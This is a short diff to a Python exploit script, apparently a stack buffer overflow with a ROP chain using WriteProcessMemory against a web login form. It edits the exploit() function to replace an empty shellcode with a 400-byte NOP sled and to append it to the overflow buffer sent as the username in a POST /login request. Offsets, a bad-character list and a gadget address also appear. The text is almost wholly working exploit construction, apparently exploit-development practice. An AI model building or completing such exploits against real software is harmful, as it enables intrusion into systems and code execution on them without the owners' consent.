@@ -188,7 +188,7 @@ def exploit():
         size = 800
         offset = 780
 
-        shellcode = b""
+        shellcode = b"\x90" * 400
         
         # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d
         # ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub 0xfffe2930
@@ -219,7 +219,7 @@ def exploit():
 
         rop = pack("<L", 0x1002f729)    # pop eax; ret ;
 
-        inputBuffer = filler + wpm + eip + rop
+        inputBuffer = filler + wpm + eip + rop + shellcode
 
         content = b"username=" + inputBuffer + b"&password=A"
         buffer = b"POST /login HTTP/1.1\r\n"
